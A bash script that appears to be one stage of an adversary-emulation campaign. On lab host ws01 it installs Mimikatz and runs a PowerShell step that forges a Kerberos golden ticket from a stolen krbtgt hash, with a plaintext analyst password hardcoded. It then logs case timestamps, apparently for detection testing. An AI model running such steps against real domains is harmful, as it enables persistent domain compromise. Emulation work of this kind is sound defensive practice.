#!/usr/bin/env bash
# T010 — Golden ticket from ws01 (post T009 krbtgt hash on ws01)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T010-GOLDEN-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T010 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_mimikatz
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t010-golden.ps1)"
printf '%s\n' "${OUT}"
campaign_require_ok T010 "${OUT}" 'T010_OK'

cadre_export "${CASE_ID}" T010 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
